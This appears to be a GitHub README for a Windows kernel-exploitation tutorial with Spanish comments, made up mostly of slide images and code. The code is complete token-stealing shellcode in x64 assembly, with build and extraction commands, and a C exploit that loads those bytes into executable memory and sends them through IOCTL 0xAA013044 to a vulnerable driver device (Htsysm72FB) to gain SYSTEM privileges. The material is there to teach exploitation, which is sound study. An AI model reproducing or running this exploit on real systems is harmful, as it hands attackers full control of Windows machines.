



![Ç](https://github.com/user-attachments/assets/333eb1f8-1e7f-4cd5-9e20-46373307bb19)
![Diapositiva2](https://github.com/user-attachments/assets/36f76735-11ad-43cd-81db-a39a9e56a11c)
![Diapositiva3](https://github.com/user-attachments/assets/a915e73b-8a3a-4cc1-9fd9-5a6769c97344)
![Diapositiva4](https://github.com/user-attachments/assets/90904774-4dc9-43d4-812d-a20d470b2899)
![Diapositiva5](https://github.com/user-attachments/assets/ee6c771f-20fd-4f77-993d-7fa3e4da50ec)
![Diapositiva6](https://github.com/user-attachments/assets/35b02bed-50c6-4be7-a9e1-b9dcf61135df)
![Diapositiva7](https://github.com/user-attachments/assets/c9fad378-28c4-4999-947a-cfae373859ee)
![Diapositiva8](https://github.com/user-attachments/assets/85e7fe38-6894-4d0f-8f43-507a091b7237)
![Diapositiva9](https://github.com/user-attachments/assets/ee89cb94-ec4a-4a08-87e9-3e45c6fe10b4)
![Diapositiva10](https://github.com/user-attachments/assets/5213da70-468c-4800-8982-90d8ce68eb86)
![Diapositiva11](https://github.com/user-attachments/assets/6543d4b7-34fb-4ca0-8445-f52b8a471562)
![Diapositiva12](https://github.com/user-attachments/assets/189781f4-5808-4240-8d71-d37a5e44ac0d)
![Diapositiva13](https://github.com/user-attachments/assets/ccbb04bb-787f-4b17-a1c4-b2d7eed180a3)
![Diapositiva14](https://github.com/user-attachments/assets/8bca8ee3-b71e-4707-8806-b78719d4be20)
![Diapositiva15](https://github.com/user-attachments/assets/6f53c0b2-7e96-479a-87f1-fd3a630c2ddb)
![Diapositiva16](https://github.com/user-attachments/assets/4704fd73-f229-49e0-8201-ed1b40a7b3ab)

```SHELLCODE
;Ensamblamos la shellcode
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;nasm -f win64 shellcode.asm -o shellcode.obj
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Enlazamos 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;x86_64-w64-mingw32-ld -o shellcode.exe shellcode.obj --entry _start
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Desensamblar
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;x86_64-w64-mingw32-objdump -d shellcode.exe > shellcode_disasm.txt
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Extraer Opcodes
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;python3 extract_shellcode.py
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; !!Importante¡¡
; Debemos de extraer del resultado los opcode a partir del primer 'push rcx' (x51)
; Hasta el ultimo 'ret' (xC3) de la funcion RestaurarRegitros
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



section .text
    global _start

_start:
    call GuardarRegistros
    call PunterosEstructuras
    call BuscarSystem
    call ObtenerToken
    call BuscarCMD
    call CopiarToken
    call RestauraRegistros
    ret

GuardarRegistros:
    push rcx
    push rdx
    push r8
    push r9
    push rdi
    ret

PunterosEstructuras:
    mov rcx, qword [gs:0x188]    ; KTRHEAD
    mov rdx, qword [rcx+0xb8]    ; EPROCESS
    mov r8, qword [rdx+0x2f0]    ; ActiveProcessLinks
    mov rdi, qword [rdx+0x3e8]   ; InheritedFromUniqueProcessId 
    mov rcx, qword [r8]
    ret

BuscarSystem:
    mov rdx, qword [rcx-8]       ; UniqueProcessId
    cmp rdx, 4                   ; PID SYSTEM comparar
    jz ObtenerToken
    mov rcx, qword [rcx]
    jmp BuscarSystem

ObtenerToken:
    mov rax, qword [rcx+0x70]    ; Objeto Token
    and al, 0xf0
    ret

BuscarCMD:
    mov rcx, qword [rcx]         ; Mi proceso
    mov rdx, qword [rcx-8]
    cmp rdx, rdi
    jne BuscarCMD
    ret

CopiarToken:
    mov qword [rcx+0x70], rax    ; Copiar token
    ret

RestauraRegistros:
    pop rdi
    pop r9
    pop r8
    pop rdx
    pop rcx
    ret
```

Exploit

```sh
#include <stdio.h>
#include <Windows.h>

int main()
{
	BYTE ShellCode[] = //86 bytes
	{
		0x51,0x52,0x41,0x50,0x41,0x51,0x57,
		0x65,0x48,0x8B,0x0C,0x25,0x88,0x01,
		0x00,0x00,0x48,0x8B,0x91,0xB8,0x00,
		0x00,0x00,0x4C,0x8B,0x82,0xF0,0x02,
		0x00,0x00,0x48,0x8B,0xBA,0xE8,0x03,
		0x00,0x00,0x49,0x8B,0x08,0x48,0x8B,
		0x51,0xF8,0x48,0x83,0xFA,0x04,0x74,
		0x05,0x48,0x8B,0x09,0xEB,0xF1,0x48,
		0x8B,0x41,0x70,0x24,0xF0,0x48,0x8B,
		0x09,0x48,0x8B,0x51,0xF8,0x48,0x3B,
		0xD7,0x75,0xF4,0x48,0x89,0x41,0x70,
		0x5F,0x41,0x59,0x41,0x58,0x5A,0x59,
		0xC3 //ret
	};

	HANDLE driverConnect = CreateFile(L"\\\\.\\Htsysm72FB", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	/*
	HANDLE CreateFileA(
  [in]           LPCSTR                lpFileName,
  [in]           DWORD                 dwDesiredAccess,
  [in]           DWORD                 dwShareMode,
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [in]           DWORD                 dwCreationDisposition,
  [in]           DWORD                 dwFlagsAndAttributes,
  [in, optional] HANDLE                hTemplateFile
);
	*/

	if (driverConnect == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "[-] No se puede acceder al Device Deriver\n");
	}

	else {

		PBYTE inBuffer = (PBYTE)VirtualAlloc(0, 100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		DWORD bytesReturned = 0;
		DWORD ioctlOutput = 0;

		*(PULONG_PTR)inBuffer = (ULONG_PTR)(inBuffer + 8); //apuntamos 8 bytes hacia delante
		memcpy(inBuffer + 8, ShellCode, 85); //copiamos 85 bytes, 8 bytes depues de la direccion
		ULONG_PTR target = (ULONG_PTR)(inBuffer + 8); //guardamos la direccion en target

		fprintf(stdout, "[+] Comienza el exploit...\n");

		if (DeviceIoControl(driverConnect, 0xAA013044, &target, 8, &ioctlOutput, 4, &bytesReturned, NULL))
			/*
		BOOL DeviceIoControl(
	  [in]                HANDLE       hDevice,
	  [in]                DWORD        dwIoControlCode,
	  [in, optional]      LPVOID       lpInBuffer,
	  [in]                DWORD        nInBufferSize,
	  [out, optional]     LPVOID       lpOutBuffer,
	  [in]                DWORD        nOutBufferSize,
	  [out, optional]     LPDWORD      lpBytesReturned,
	  [in, out, optional] LPOVERLAPPED lpOverlapped
	);
			*/
		{
			fprintf(stdout, "[+] DeviceIoControl OK... \n");
			fprintf(stdout, "[+] Somos SYSTEM!!!!! \n");
		}
		else {
			fprintf(stderr, "[-] DeviceIoControl ERROR\n");
			system("pause");
		}

		CloseHandle(driverConnect);
	}
}
```
![ IMPORTANTE-PsGetCurrentProcess](https://github.com/kdRajKit/KERNEL-EXPLOITING/assets/108155637/425d7c02-8aa4-4332-a956-e56ca692ea96)

